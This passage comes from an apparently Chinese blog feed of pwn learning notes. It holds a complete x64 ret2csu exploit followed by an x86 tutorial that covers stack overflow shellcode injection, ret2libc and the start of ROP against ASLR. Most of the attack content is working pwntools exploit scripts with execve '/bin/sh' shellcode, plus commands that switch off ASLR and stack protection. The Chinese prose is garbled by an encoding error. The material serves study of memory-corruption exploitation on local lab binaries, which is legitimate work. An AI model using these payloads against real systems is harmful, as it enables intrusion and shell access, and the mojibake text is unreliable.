<p>æˆ‘ä»¬å…ˆæ„é€ payload1ï¼Œåˆ©ç”¨write()è¾“å‡ºwriteåœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚æ³¨æ„æˆ‘ä»¬çš„gadgetæ˜¯call qword ptr [r12+rbx*8]ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä½¿ç”¨write.gotçš„åœ°å€è€Œä¸æ˜¯write.pltçš„åœ°å€ã€‚å¹¶ä¸”ä¸ºäº†è¿”å›åˆ°åŸç¨‹åºä¸­ï¼Œé‡å¤åˆ©ç”¨buffer overflowçš„æ¼æ´ï¼Œæˆ‘ä»¬éœ€è¦ç»§ç»­è¦†ç›–æ ˆä¸Šçš„æ•°æ®ï¼Œç›´åˆ°æŠŠè¿”å›å€¼è¦†ç›–æˆç›®æ ‡å‡½æ•°çš„mainå‡½æ•°ä¸ºæ­¢ã€‚</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)
</code></pre><p>å½“æˆ‘ä»¬expåœ¨æ”¶åˆ°write()åœ¨å†…å­˜ä¸­çš„åœ°å€åï¼Œå°±å¯ä»¥è®¡ç®—å‡ºsystem()åœ¨å†…å­˜ä¸­çš„åœ°å€äº†ã€‚æ¥ç€æˆ‘ä»¬æ„é€ payload2ï¼Œåˆ©ç”¨read()å°†system()çš„åœ°å€ä»¥åŠâ€œ/bin/shâ€è¯»å…¥åˆ°.bssæ®µå†…å­˜ä¸­ã€‚</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)
</code></pre><p>æœ€åæˆ‘ä»¬æ„é€ payload3,è°ƒç”¨system()å‡½æ•°æ‰§è¡Œâ€œ/bin/shâ€ã€‚æ³¨æ„ï¼Œsystem()çš„åœ°å€ä¿å­˜åœ¨äº†.bssæ®µé¦–åœ°å€ä¸Šï¼Œâ€œ/bin/shâ€çš„åœ°å€ä¿å­˜åœ¨äº†.bssæ®µé¦–åœ°å€+8å­—èŠ‚ä¸Šã€‚</p>
<pre><code>#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)
</code></pre><p>æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

elf = ELF(&apos;level5&apos;)
libc = ELF(&apos;libc.so.6&apos;)

p = process(&apos;./level5&apos;)
#p = remote(&apos;127.0.0.1&apos;,10001)

got_write = elf.got[&apos;write&apos;]
print &quot;got_write: &quot; + hex(got_write)
got_read = elf.got[&apos;read&apos;]
print &quot;got_read: &quot; + hex(got_read)

main = 0x400564

off_system_addr = libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;]
print &quot;off_system_addr: &quot; + hex(off_system_addr)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#write(rdi=1, rsi=write.got, rdx=4)
payload1 =  &quot;\x00&quot;*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += &quot;\x00&quot;*56
payload1 += p64(main)

p.recvuntil(&quot;Hello, World\n&quot;)

print &quot;\n#############sending payload1#############\n&quot;
p.send(payload1)
sleep(1)

write_addr = u64(p.recv(8))
print &quot;write_addr: &quot; + hex(write_addr)

system_addr = write_addr - off_system_addr
print &quot;system_addr: &quot; + hex(system_addr)

bss_addr=0x601028

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#read(rdi=0, rsi=bss_addr, rdx=16)
payload2 =  &quot;\x00&quot;*136
payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += &quot;\x00&quot;*56
payload2 += p64(main)

print &quot;\n#############sending payload2#############\n&quot;
p.send(payload2)
sleep(1)

p.send(p64(system_addr))
p.send(&quot;/bin/sh\0&quot;)
sleep(1)

p.recvuntil(&quot;Hello, World\n&quot;)

#rdi=  edi = r13,  rsi = r14, rdx = r15 
#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)
payload3 =  &quot;\x00&quot;*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += &quot;\x00&quot;*56
payload3 += p64(main)

print &quot;\n#############sending payload3#############\n&quot;

sleep(1)
p.send(payload3)
</code></pre>]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnå­¦ä¹ ropä¹‹x86ç¯‡</title>
    <url>/2016/11/19/pwn%D1%A7%CF%B0rop%D6%AEx86%C6%AA/</url>
    <content><![CDATA[<p>è¿™æ®µæ—¶é—´è‡ªå­¦äº†è’¸ç±³å¤§ç¥å†™çš„ä¸€æ­¥ä¸€æ­¥å­¦ropç³»åˆ—ï¼Œä»¥ä¸‹éƒ½æ˜¯æˆ‘çš„å­¦ä¹ å¿ƒå¾—ã€‚ã€‚ã€‚<br><a id="more"></a></p>
<h2 id="åº"><a href="#åº" class="headerlink" title="åº"></a>åº</h2><p>åœ¨è¯´ROPä¹‹å‰ï¼Œå…ˆæ¥è¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼ˆbuffer overflowï¼‰æ˜¯å½“ä»Šè½¯ä»¶ç³»ç»Ÿæœ€ä¸»è¦çš„å®‰å…¨æ¼æ´ï¼Œåˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„æ”»å‡»ä¹Ÿæ˜¯æ”»å‡»è€…æœ€å¸¸ç”¨çš„æ”»å‡»æ–¹å¼ä¹‹ä¸€ã€‚æ‰€è°“ç¼“å†²åŒºæº¢å‡ºï¼Œæ˜¯æŒ‡åœ¨åº”ç”¨ç¨‹åºæˆ–è€…ç³»ç»Ÿç¨‹åºçš„å†…å­˜ä¸­å†™å…¥è¶…é•¿æ•°æ®ï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”¹å˜æˆ–è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„ç›®çš„ã€‚æ”»å‡»è€…é€šè¿‡ç¼“å†²åŒºæº¢å‡ºæŠŠshellcodeå†™å…¥ç¨‹åºçš„å†…å­˜ç©ºé—´ï¼Œå¹¶ä¸”é€šè¿‡è¦†ç›–æ ˆä¸Šå‡½æ•°çš„è¿”å›åœ°å€ï¼Œå³EIPå¯„å­˜å™¨æ‰€æŒ‡å‘çš„å†…å­˜åœ°å€çš„å€¼ï¼Œæˆ–è€…è¦†ç›–SEHé“¾è¡¨æ¥å®ç°ç¨‹åºæ‰§è¡Œæµç¨‹çš„æ§åˆ¶ï¼Œä½¿å¾—æ¤å…¥å†…å­˜çš„shellcodeå¾—ä»¥æ‰§è¡Œã€‚</p>
<p>æ ˆæº¢å‡ºï¼ˆstack-based buffer overflowsï¼‰ç®—æ˜¯å®‰å…¨ç•Œå¸¸è§çš„æ¼æ´ã€‚ä¸€æ–¹é¢å› ä¸ºç¨‹åºå‘˜çš„ç–å¿½ï¼Œä½¿ç”¨äº† strcpyã€sprintfç­‰ä¸å®‰å…¨çš„å‡½æ•°ï¼Œå¢åŠ äº†æ ˆæº¢å‡ºæ¼æ´çš„å¯èƒ½ã€‚å¦ä¸€æ–¹é¢ï¼Œå› ä¸ºæ ˆä¸Šä¿å­˜äº†å‡½æ•°çš„è¿”å›åœ°å€ç­‰ä¿¡æ¯ï¼Œå› æ­¤å¦‚æœæ”»å‡»è€…èƒ½ä»»æ„è¦†ç›–æ ˆä¸Šçš„æ•°æ®ï¼Œé€šå¸¸æƒ…å†µä¸‹å°±æ„å‘³ç€ä»–èƒ½ä¿®æ”¹ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä»è€Œé€ æˆæ›´å¤§çš„ç ´åã€‚</p>
<p>ROPçš„å…¨ç§°ä¸ºReturn-oriented programmingï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ï¼Œè¿™æ˜¯ä¸€ç§é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰ã€‚</p>
<p>æ‰€è°“ROPï¼Œç®€å•çš„è¯´å°±æ˜¯æŠŠåŸæ¥å·²ç»å­˜åœ¨çš„ä»£ç å—æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æ¥çš„æ–¹å¼æ˜¯é€šè¿‡ä¸€ä¸ªé¢„å…ˆå‡†å¤‡å¥½çš„ç‰¹æ®Šçš„è¿”å›æ ˆï¼Œé‡Œé¢åŒ…å«äº†å„æ¡æŒ‡ä»¤ç»“æŸåä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p>
<p>åœ¨ä¸€èˆ¬ç¨‹åºé‡Œé¢ï¼Œéƒ½åŒ…å«ç€å¤§é‡çš„è¿”å›æŒ‡ä»¤ï¼ˆretï¼‰ï¼Œä»–ä»¬åŸºæœ¬ä½äºå‡½æ•°çš„å°¾éƒ¨ï¼Œæˆ–æ˜¯å‡½æ•°ä¸­éƒ¨éœ€è¦è¿”å›çš„åœ°æ–¹ã€‚è€Œä»å‡½æ•°å¼€å§‹çš„åœ°æ–¹åˆ°retæŒ‡ä»¤ä¹‹é—´çš„è¿™ä¸€æ®µåºåˆ—ç§°ä¸ºäºŒè¿›åˆ¶æŒ‡ä»¤ä»£ç å—ï¼ˆgadgetsï¼‰ã€‚è¿™äº›äºŒè¿›åˆ¶æŒ‡ä»¤åºåˆ—ä½¿å…¶ç»„åˆæˆå®Œæˆä¸€äº›è¯¸å¦‚è¯»å†™å†…å­˜ã€ç®—æœ¯é€»è¾‘è¿ç®—ã€æ§åˆ¶æµç¨‹è·³è½¬ã€å‡½æ•°è°ƒç”¨ç­‰æ“ä½œã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åˆ©ç”¨å†…å­˜ç©ºé—´ä¸­å„ä¸ªgadgetsä»¥æŸç§é¡ºåºæ‰§è¡Œï¼Œè¾¾åˆ°è¿›è¡Œä»»æ„æ“ä½œçš„ç›®çš„ã€‚è€Œä¸ºäº†ä½¿å„ä¸ªgadgetsâ€œæ‹¼æ¥â€èµ·æ¥ï¼Œæˆ‘ä»¬å°±éœ€è¦æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„è¿”å›æ ˆã€‚é¦–å…ˆè®©æŒ‡å‘æˆ‘ä»¬æ„é€ çš„æ ˆï¼ˆstackï¼‰çš„æŒ‡é’ˆè·³åˆ°gadget Aä¸­ï¼Œæ‰§è¡Œå…¶ä¸­çš„ä»£ç åºåˆ—åretå›æˆ‘ä»¬çš„stackä¸­ï¼Œç„¶åä¸‹ä¸€æ­¥æ˜¯è·³åˆ°gadget Bï¼Œæ‰§è¡Œåå°±åˆ°gadgets Câ€¦â€¦åªè¦stackè¶³å¤Ÿå¤§ï¼Œå°±èƒ½è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœã€‚</p>
<h2 id="Control-Flow-Hijack-ç¨‹åºæµåŠ«æŒ"><a href="#Control-Flow-Hijack-ç¨‹åºæµåŠ«æŒ" class="headerlink" title="Control Flow Hijack ç¨‹åºæµåŠ«æŒ"></a>Control Flow Hijack ç¨‹åºæµåŠ«æŒ</h2><p>æ¯”è¾ƒå¸¸è§çš„ç¨‹åºæµåŠ«æŒå°±æ˜¯æ ˆæº¢å‡ºï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»å’Œå †æº¢å‡ºäº†ã€‚é€šè¿‡ç¨‹åºæµåŠ«æŒï¼Œæ”»å‡»è€…å¯ä»¥æ§åˆ¶PCæŒ‡é’ˆä»è€Œæ‰§è¡Œç›®æ ‡ä»£ç ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æ”»å‡»ï¼Œç³»ç»Ÿé˜²å¾¡è€…ä¹Ÿæå‡ºäº†å„ç§é˜²å¾¡æ–¹æ³•ï¼Œæœ€å¸¸è§çš„æ–¹æ³•æœ‰DEPï¼ˆå †æ ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒASLRï¼ˆå†…å­˜åœ°å€éšæœºåŒ–ï¼‰ï¼ŒStack Protectorï¼ˆæ ˆä¿æŠ¤ï¼‰ç­‰ã€‚ï¼ˆè¯¦ç»†äº†è§£å¯ä»¥å»çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢<a href="http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶</a>ï¼‰æˆ‘ä»¬è¿™äº›åˆå­¦çš„èœé¸Ÿå…ˆä¸€æ­¥ä¸€æ­¥æ¥ï¼Œä¹‹åå†åŠ ä¸Šå„ç§é˜²å¾¡æªæ–½ï¼Œæ¥ç€å†å­¦ä¹ ç»•è¿‡æ–¹æ³•ï¼Œæ‰€è°“å¾ªåºæ¸è¿›å˜›ã€‚ã€‚ã€‚</p>
<p>é¦–å…ˆæ¥çœ‹çœ‹æˆ‘ä»¬è¦ç”¨çš„ç®€å•çš„ç¼“å†²åŒºæº¢å‡ºä¾‹å­ï¼š</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
    vulnerable_function();
    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);
}
</code></pre><p>æ³¨æ„è¿™ä¸ªä¾‹å­éœ€è¦åœ¨32ä½çš„liunxç³»ç»Ÿä¸‹ç¼–è¯‘ï¼Œå­¦64ä½çš„æ—¶å€™åœ¨64ä½ç³»ç»Ÿä¸‹ç¼–è¯‘ã€‚æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç¼–è¯‘å®ƒï¼š</p>
<pre><code>gcc -fno-stack-protector -z execstack -o test1 test.    
</code></pre><p>è¿™ä¸ªå‘½ä»¤ç¼–è¯‘ç¨‹åºã€‚-fno-stack-protectorå’Œ-z execstackè¿™ä¸¤ä¸ªå‚æ•°ä¼šåˆ†åˆ«å…³æ‰DEPå’ŒStack Protectorã€‚åŒæ—¶æˆ‘ä»¬åœ¨shellä¸­æ‰§è¡Œï¼š</p>
<pre><code>sudo -s 
echo 0 &gt; /proc/sys/kernel/randomize_va_space
exit
</code></pre><p>è¿™å‡ ä¸ªæŒ‡ä»¤ã€‚æ‰§è¡Œå®Œåæˆ‘ä»¬å°±å…³æ‰æ•´ä¸ªlinuxç³»ç»Ÿçš„ASLRä¿æŠ¤ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹å¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œåˆ†æã€‚é¦–å…ˆæˆ‘ä»¬å…ˆæ¥ç¡®å®šæº¢å‡ºç‚¹çš„ä½ç½®ï¼Œè¿™é‡Œæˆ‘æ¨èä½¿ç”¨gdbæ’ä»¶pedaè‡ªå¸¦çš„patternè¿™ä¸ªè„šæœ¬æ¥è¿›è¡Œè®¡ç®—ã€‚æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p>
<p><img src="http://p1.bqimg.com/567571/4e8b1d7f01ef6a38.png" alt=""></p>
<p>ä¹‹åä½¿ç”¨gdbè°ƒè¯•</p>
<p><img src="http://p1.bqimg.com/567571/5134a5b537aa2d73.png" alt=""><br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å†…å­˜å‡ºé”™åœ°å€ä¸º0x41416d41.ä¹‹åä½¿ç”¨å‘½ä»¤ï¼š</p>
<p><img src="http://p1.bpimg.com/567571/fadaebd3da23a2e0.png" alt=""></p>
<p>å°±å¯ä»¥éå¸¸å®¹æ˜“çš„è®¡ç®—å‡ºPCè¿”å›å€¼çš„è¦†ç›–ç‚¹ä¸º140ä¸ªå­—èŠ‚ã€‚æˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªâ€Aâ€*140+retå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è®©pcæ‰§è¡Œretåœ°å€ä¸Šçš„ä»£ç äº†ã€‚</p>
<p>ä¹‹åå°±æ˜¯ç”Ÿæˆä¸€æ®µshellcodeå¯ä»¥åœ¨ç½‘ä¸Šæ‰¾ç°æˆçš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨msfç”Ÿæˆã€‚ä½œä¸ºä¸€ä¸ªåˆå­¦è€…ï¼Œshellcodeçš„åœ°å€å¹¶ä¸å¥½æ‰¾ï¼Œå› ä¸ºgdbè°ƒè¯•çš„æ—¶å€™ä¼šå½±å“bufåœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œè’¸ç±³å¤§ç¥æ¨ä»‹äº†ä¸€ä¸ªå¥½çš„æ–¹æ³•ï¼š</p>
<p>å¼€å»core dump è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<pre><code>ulimit -c unlimited
sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;
</code></pre><p>å¼€å¯ä¹‹åï¼Œå½“å‡ºç°å†…å­˜é”™è¯¯çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªcore dumpæ–‡ä»¶åœ¨tmpç›®å½•ä¸‹ã€‚ç„¶åæˆ‘ä»¬å†ç”¨gdbæŸ¥çœ‹è¿™ä¸ªcoreæ–‡ä»¶å°±å¯ä»¥è·å–åˆ°bufçœŸæ­£çš„åœ°å€äº†ã€‚</p>
<p><img src="http://p1.bqimg.com/567571/dc30b05d3c9ad4ba.png" alt=""></p>
<p>å› ä¸ºæº¢å‡ºç‚¹æ˜¯140ä¸ªå­—èŠ‚ï¼Œå†åŠ ä¸Š4ä¸ªå­—èŠ‚çš„retåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºbufferçš„åœ°å€ä¸º$esp-144ã€‚é€šè¿‡gdbçš„å‘½ä»¤ â€œx/10s $esp-144â€ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°bufçš„åœ°å€ä¸º0xfff66bfdã€‚</p>
<p>OKï¼Œç°åœ¨æº¢å‡ºç‚¹ï¼Œshellcodeå’Œè¿”å›å€¼åœ°å€éƒ½æœ‰äº†ï¼Œå¯ä»¥å¼€å§‹å†™expäº†ã€‚</p>
<p>æœ€ç»ˆæœ¬åœ°æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./test&apos;) 
ret =0xfff66bfd 

shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;
shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;
shellcode += &quot;\x0b\xcd\x80&quot;

# p32(ret) == struct.pack(&quot;&lt;I&quot;,ret) 
#å¯¹retè¿›è¡Œç¼–ç ï¼Œå°†åœ°å€è½¬æ¢æˆå†…å­˜ä¸­çš„äºŒè¿›åˆ¶å­˜å‚¨å½¢å¼
payload = shellcode + &apos;A&apos; * (140 - len(shellcode)) + p32(ret)

p.send(payload) #å‘é€payload

p.interactive()  #å¼€å¯äº¤äº’shell
</code></pre><p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠè¿™ä¸ªç›®æ ‡ç¨‹åºä½œä¸ºä¸€ä¸ªæœåŠ¡ç»‘å®šåˆ°æœåŠ¡å™¨çš„æŸä¸ªç«¯å£ä¸Šï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨socatè¿™ä¸ªå·¥å…·æ¥å®Œæˆï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code>socat TCP4-LISTEN:10001,fork EXEC:./level1
</code></pre><p>éšåè¿™ä¸ªç¨‹åºçš„IOå°±è¢«é‡å®šå‘åˆ°10001è¿™ä¸ªç«¯å£ä¸Šäº†ï¼Œå¹¶ä¸”å¯ä»¥ä½¿ç”¨ nc 127.0.0.1 10001æ¥è®¿é—®æˆ‘ä»¬çš„ç›®æ ‡ç¨‹åºæœåŠ¡äº†ã€‚</p>
<p>å› ä¸ºç°åœ¨ç›®æ ‡ç¨‹åºæ˜¯è·‘åœ¨socatçš„ç¯å¢ƒä¸­ï¼Œexpè„šæœ¬é™¤äº†è¦æŠŠp = process(â€˜./level1â€™)æ¢æˆp = remote(â€˜127.0.0.1â€™,10001) ä¹‹å¤–ï¼Œretçš„åœ°å€è¿˜ä¼šå‘ç”Ÿæ”¹å˜ã€‚è§£å†³æ–¹æ³•è¿˜æ˜¯é‡‡ç”¨ç”Ÿæˆcore dumpçš„æ–¹æ¡ˆï¼Œç„¶åç”¨gdbè°ƒè¯•coreæ–‡ä»¶è·å–è¿”å›åœ°å€ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨expè¿›è¡Œè¿œç¨‹æº¢å‡ºå•¦ï¼</p>
<h2 id="0x02-Ret2libc-â€“-Bypass-DEP-é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤"><a href="#0x02-Ret2libc-â€“-Bypass-DEP-é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤" class="headerlink" title="0x02 Ret2libc â€“ Bypass DEP é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤"></a>0x02 Ret2libc â€“ Bypass DEP é€šè¿‡ret2libcç»•è¿‡DEPé˜²æŠ¤</h2><p>ç°åœ¨æˆ‘ä»¬æŠŠDEPæ‰“å¼€ï¼Œä¾ç„¶å…³é—­stack protectorå’ŒASLRã€‚ç¼–è¯‘æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code>gcc -fno-stack-protector -o test2 test.c
</code></pre><p>æˆ‘ä»¬çŸ¥é“test2è°ƒç”¨äº†libc.soï¼Œå¹¶ä¸”libc.soé‡Œä¿å­˜äº†å¤§é‡å¯åˆ©ç”¨çš„å‡½æ•°ï¼Œæˆ‘ä»¬å¦‚æœå¯ä»¥è®©ç¨‹åºæ‰§è¡Œsystem(â€œ/bin/shâ€)çš„è¯ï¼Œä¹Ÿå¯ä»¥è·å–åˆ°shellã€‚æ—¢ç„¶æ€è·¯æœ‰äº†ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜å°±æ˜¯å¦‚ä½•å¾—åˆ°system()è¿™ä¸ªå‡½æ•°çš„åœ°å€ä»¥åŠâ€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„åœ°å€ã€‚</p>
<pre><code>$ gdb ./test2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
â€¦.
(gdb) break main
Breakpoint 1 at 0x8048430
(gdb) run
Starting program: /home/mzheng/CTF/groupstudy/test/test2 

Breakpoint 1, 0x08048430 in main ()
(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;
(gdb) print __libc_start_main
$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;
(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;(gdbå¦‚æœå®‰è£…æœ‰pedaæ’ä»¶è²Œä¼¼è¿™è·³å‘½ä»¤æ‰¾ä¸åˆ°)
0xb7f81ff8
warning: Unable to access target memory at 0xb7fc8500, halting search.
1 pattern found.
(gdb) x/s 0xb7f81ff8
0xb7f81ff8:  &quot;/bin/sh&quot;
</code></pre><p>æˆ‘ä»¬é¦–å…ˆåœ¨mainå‡½æ•°ä¸Šä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶åæ‰§è¡Œç¨‹åºï¼Œè¿™æ ·çš„è¯ç¨‹åºä¼šåŠ è½½libc.soåˆ°å†…å­˜ä¸­ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡â€print systemâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–systemå‡½æ•°åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œéšåæˆ‘ä»¬å¯ä»¥é€šè¿‡â€ print __libc_start_mainâ€è¿™ä¸ªå‘½ä»¤æ¥è·å–libc.soåœ¨å†…å­˜ä¸­çš„èµ·å§‹ä½ç½®ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡findå‘½ä»¤æ¥æŸ¥æ‰¾â€/bin/shâ€è¿™ä¸ªå­—ç¬¦ä¸²ã€‚è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†systemçš„åœ°å€0xb7e5f460ä»¥åŠâ€/bin/shâ€çš„åœ°å€0xb7f81ff8ã€‚ä¸‹é¢æˆ‘ä»¬å¼€å§‹å†™expï¼š</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *

p = process(&apos;./level2&apos;)
#p = remote(&apos;127.0.0.1&apos;,10002)

ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8

payload =  &apos;A&apos;*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)

p.send(payload)

p.interactive()
</code></pre><h2 id="ROPâ€“-Bypass-DEP-and-ASLR-é€šè¿‡ROPç»•è¿‡DEPå’ŒASLRé˜²æŠ¤"><a href="#ROPâ€“-Bypass-DEP-and-ASLR-é€šè¿‡ROPç»•è¿‡DEPå’ŒASLRé˜²æŠ¤" class="headerlink" title="ROPâ€“ Bypass DEP and ASLR é€šè¿‡ROPç»•è¿‡DEPå’ŒASLRé˜²æŠ¤"></a>ROPâ€“ Bypass DEP and ASLR é€šè¿‡ROPç»•è¿‡DEPå’ŒASLRé˜²æŠ¤</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰“å¼€ASLRä¿æŠ¤ã€‚</p>
<pre><code>sudo -s 
echo 2 &gt; /proc/sys/kernel/randomize_va_space
</code></pre><p>ä»ç°åœ¨å¼€å§‹ä¼šå‘ç°testçš„libc.soçš„åœ°å€æ¯æ¬¡éƒ½ä¼šå˜åŒ–ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦å…ˆæ³„æ¼å‡ºlibc.soæŸäº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†åˆ©ç”¨æ³„æ¼å‡ºçš„å‡½æ•°åœ°å€æ ¹æ®åç§»é‡è®¡ç®—å‡ºsystem()å‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç„¶åå†æ‰§è¡Œæˆ‘ä»¬çš„ret2libcçš„shellcodeã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠè¿”å›å€¼è®¾ç½®åˆ°ç¨‹åºæœ¬èº«å°±å¯æ‰§è¡Œæˆ‘ä»¬æœŸæœ›çš„æŒ‡ä»¤äº†ã€‚é¦–å…ˆæˆ‘ä»¬åˆ©ç”¨objdumpæ¥æŸ¥çœ‹å¯ä»¥åˆ©ç”¨çš„pltå‡½æ•°å’Œå‡½æ•°å¯¹åº”çš„gotè¡¨ï¼š</p>
<p><img src="http://p1.bqimg.com/567571/6448270ab01e52b6.png" alt=""></p>
<p><img src="http://p1.bqimg.com/567571/c0f9f3cc460b2922.png" alt=""></p>
